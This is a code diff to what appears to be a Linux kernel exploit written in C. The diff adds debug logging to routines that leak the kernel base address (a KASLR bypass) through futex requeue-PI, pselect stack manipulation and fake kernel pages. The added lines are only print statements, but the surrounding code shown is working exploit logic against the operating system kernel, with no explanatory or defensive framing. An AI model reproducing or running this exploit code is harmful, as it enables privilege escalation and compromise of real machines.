@@ -177,6 +177,8 @@ void slide_pselect_stack_copy(void) {
 
   atomic_store(&slide_consume_go, 1);
   errno = 0;
+  pr_info("slide pselect: calling pselect nfds=%d shift=%d pid=%d\n",
+          SLIDE_PSELECT_NFDS, slide_word_shift, getpid());
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
@@ -383,15 +385,19 @@ uint64_t slide_child_leak_stext(void) {
   }
 
   errno = 0;
+  pr_info("slide child: before futex requeue pid=%d\n", getpid());
   futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
            &slide_f_pi_target, 0);
+  pr_info("slide child: after futex requeue pid=%d\n", getpid());
 
   usleep(50000);
+  pr_info("slide child: before SIGALRM pid=%d\n", getpid());
   pthread_kill(waiter, SIGALRM);
 
   while (!atomic_load(&slide_route_done)) {
     sleep(1);
   }
+  pr_info("slide child: route done, reading stext pid=%d\n", getpid());
 
   return slide_read_stext();
 }
@@ -405,8 +411,12 @@ int slide_leak_kernel_base(void) {
 
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
+      pr_info("slide attempt %d/%d skipped (page_base=%016zx fake_lock=%016zx)\n",
+              attempt, SLIDE_MAX_ATTEMPTS, page_base, fake_lock);
       continue;
     }
+    pr_info("slide attempt %d/%d shift=%d page_base=%016zx fake_lock=%016zx\n",
+            attempt, SLIDE_MAX_ATTEMPTS, slide_word_shift, page_base, fake_lock);
 
     int raw_fds[2];
     SYSCHK(pipe(raw_fds));
